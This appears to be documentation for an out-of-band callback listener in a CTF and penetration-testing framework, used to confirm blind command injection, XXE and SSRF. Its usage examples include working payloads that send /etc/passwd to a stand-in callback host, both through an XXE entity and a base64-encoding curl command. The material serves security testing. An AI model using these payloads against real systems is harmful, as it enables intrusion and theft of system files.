# OOB Listener Documentation

## Overview

The Out-of-Band (OOB) Listener is a critical component of the VulnChain CTF framework that captures HTTP and DNS callbacks from exploited targets. This enables detection of blind vulnerabilities where the application doesn't directly return exploitable output.

## Features

### 1. HTTP Callback Listener
- Listens on a configurable port for incoming HTTP requests
- Captures all HTTP methods (GET, POST, PUT, DELETE, etc.)
- Records complete request details: headers, query parameters, body, source IP
- Supports unique identifier correlation for payload tracking

### 2. DNS Callback Listener
- Listens on a configurable port for DNS queries
- Captures DNS query names and types
- Extracts unique identifiers from subdomain queries
- Useful for blind SSRF, XXE, and command injection detection

### 3. Payload Correlation
- Register payloads with unique identifiers before sending
- Automatically correlate incoming callbacks with originating payloads
- Track vulnerability type, target URL, and injection point
- Support for concurrent OOB tests with multiple unique identifiers

### 4. Automatic Data Decoding
- Automatically attempts to decode exfiltrated data
- Supports multiple encoding schemes:
  - Base64 (standard and URL-safe)
  - URL encoding (single and double)
  - Hex encoding
  - Chained encodings (e.g., URL+Base64)
- Intelligent scoring system to select best decoding result

## Usage

### Basic Setup

```python
from app.core.oob_listener import OOBListener

# Initialize listener
listener = OOBListener(
    http_port=8080,
    dns_port=53,
    domain="oob.example.com"
)

# Start listening
await listener.start()
```

### Generating Unique Identifiers

```python
# Generate a unique ID for payload correlation
unique_id = listener.generate_unique_id()

# Get callback URLs
http_url = listener.get_callback_url(unique_id)
# Returns: http://oob.example.com:8080/<unique_id>

dns_hostname = listener.get_dns_callback(unique_id)
# Returns: <unique_id>.oob.example.com
```

### Registering Payloads

```python
# Register payload before sending to target
await listener.register_payload(
    unique_id=unique_id,
    payload="curl http://oob.example.com:8080/{}".format(unique_id),
    target_url="https://vulnerable-app.com/api/endpoint",
    injection_point="command_param",
    vulnerability_type="command_injection",
    metadata={"test_case": "blind_rce"}
)
```

### Waiting for Callbacks

```python
# Wait for callback with timeout
callback = await listener.wait_for_callback(unique_id, timeout=30.0)

if callback:
    print(f"Received callback from {callback.source_ip}")
    print(f"Decoded data: {callback.decoded_data}")
else:
    print("No callback received within timeout")
```

### Retrieving Callbacks

```python
# Get all callbacks for a specific unique ID
callbacks = listener.get_callbacks(unique_id)

# Get all callbacks
all_callbacks = listener.get_callbacks()

# Get correlated payload and callbacks
payload_reg, callbacks = listener.get_correlated_callbacks(unique_id)
```

### Correlating Callbacks with Payloads

```python
# Get all correlations
correlations = listener.get_all_correlations()

for payload_reg, callbacks in correlations:
    print(f"Vulnerability: {payload_reg.vulnerability_type}")
    print(f"Target: {payload_reg.target_url}")
    print(f"Callbacks received: {len(callbacks)}")
    
    for callback in callbacks:
        print(f"  - From {callback.source_ip} at {callback.timestamp}")
        if callback.decoded_data:
            print(f"    Decoded: {callback.decoded_data}")
```

### Streaming Callbacks

```python
# Stream callbacks in real-time
async for callback in listener.stream_callbacks():
    print(f"New callback: {callback.callback_type} from {callback.source_ip}")
    
    # Correlate with payload
    payload_reg = listener.correlate_callback(callback)
    if payload_reg:
        print(f"Matched to {payload_reg.vulnerability_type} test")
```

### Cleanup

```python
# Clear specific callbacks
listener.clear_callbacks(unique_id)

# Clear all callbacks
listener.clear_callbacks()

# Stop listener
await listener.stop()
```

## Use Cases

### 1. Blind Command Injection

```python
unique_id = listener.generate_unique_id()
callback_url = listener.get_callback_url(unique_id)

# Register payload
await listener.register_payload(
    unique_id=unique_id,
    payload=f"curl {callback_url}",
    target_url="https://target.com/api/exec",
    injection_point="cmd",
    vulnerability_type="command_injection"
)

# Send payload to target
# ... (send request with payload)

# Wait for callback
callback = await listener.wait_for_callback(unique_id, timeout=10.0)
if callback:
    print("Command injection confirmed!")
```

### 2. Blind XXE with Data Exfiltration

```python
unique_id = listener.generate_unique_id()
callback_url = listener.get_callback_url(unique_id)

# XXE payload that exfiltrates /etc/passwd
xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY exfil SYSTEM "{callback_url}?data=%xxe;">
]>
<root>&exfil;</root>
"""

await listener.register_payload(
    unique_id=unique_id,
    payload=xxe_payload,
    target_url="https://target.com/api/xml",
    injection_point="xml_body",
    vulnerability_type="xxe"
)

# Send XXE payload
# ... (send request)

# Wait for callback with exfiltrated data
callback = await listener.wait_for_callback(unique_id, timeout=15.0)
if callback and callback.decoded_data:
    print(f"Exfiltrated data: {callback.decoded_data}")
```

### 3. Blind SSRF Detection

```python
unique_id = listener.generate_unique_id()
dns_hostname = listener.get_dns_callback(unique_id)

# SSRF payload
ssrf_payload = f"http://{dns_hostname}"

await listener.register_payload(
    unique_id=unique_id,
    payload=ssrf_payload,
    target_url="https://target.com/api/fetch",
    injection_point="url",
    vulnerability_type="ssrf"
)

# Send SSRF payload
# ... (send request)

# Wait for DNS callback
callback = await listener.wait_for_callback(unique_id, timeout=10.0)
if callback and callback.callback_type == "dns":
    print("SSRF confirmed via DNS callback!")
```

### 4. Encoded Data Exfiltration

```python
unique_id = listener.generate_unique_id()
callback_url = listener.get_callback_url(unique_id)

# Payload that base64-encodes data before exfiltration
payload = f"curl {callback_url}?data=$(cat /etc/passwd | base64)"

await listener.register_payload(
    unique_id=unique_id,
    payload=payload,
    target_url="https://target.com/api/exec",
    injection_point="cmd",
    vulnerability_type="command_injection"
)

# Send payload
# ... (send request)

# Wait for callback - data will be automatically decoded
callback = await listener.wait_for_callback(unique_id, timeout=10.0)
if callback:
    # decoded_data will contain the base64-decoded content
    print(f"Decoded /etc/passwd: {callback.decoded_data}")
```

## Configuration

The OOB Listener can be configured via environment variables or the Settings class:

```python
# In app/core/config.py
class Settings(BaseSettings):
    # OOB Listener
    OOB_HTTP_PORT: int = 8080
    OOB_DNS_PORT: int = 53
    OOB_DOMAIN: str = "oob.vulnchain.local"
```

## Security Considerations

1. **Port Privileges**: DNS listener on port 53 requires root/admin privileges
2. **Network Exposure**: Ensure the OOB listener is accessible from target networks
3. **Rate Limiting**: Consider implementing rate limiting for production deployments
4. **Data Validation**: Always validate and sanitize decoded data before use
5. **Logging**: All callbacks are logged for audit purposes

## Architecture

```
┌─────────────────┐
│  Target System  │
└────────┬────────┘
         │ HTTP/DNS Callback
         ▼
┌─────────────────┐
│  OOB Listener   │
├─────────────────┤
│ HTTP Server     │◄─── Port 8080
│ DNS Server      │◄─── Port 53
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ Callback Store  │
│ - Correlations  │
│ - Payloads      │
│ - Decoded Data  │
└─────────────────┘
```

## Testing

Run the test suite:

```bash
pytest tests/test_oob_listener.py -v
```

The test suite covers:
- HTTP callback reception
- DNS callback reception (requires privileges)
- Payload registration and correlation
- Automatic data decoding (Base64, URL, Hex)
- Concurrent callback handling
- Timeout handling
- Callback streaming

## Requirements

- Python 3.11+
- aiohttp (HTTP server)
- dnslib (DNS server)
- asyncio (async operations)

## Limitations

1. DNS listener requires elevated privileges (root/admin) for port 53
2. DNS callbacks may be blocked by firewalls or DNS filtering
3. Decoding is best-effort and may not work for all encoding schemes
4. Large data exfiltration via DNS is limited by DNS query length

## Future Enhancements

- Support for SMTP callbacks
- Support for FTP callbacks
- Custom decoding plugins
- Webhook notifications for callbacks
- Persistent storage of callbacks
- Web UI for real-time callback monitoring
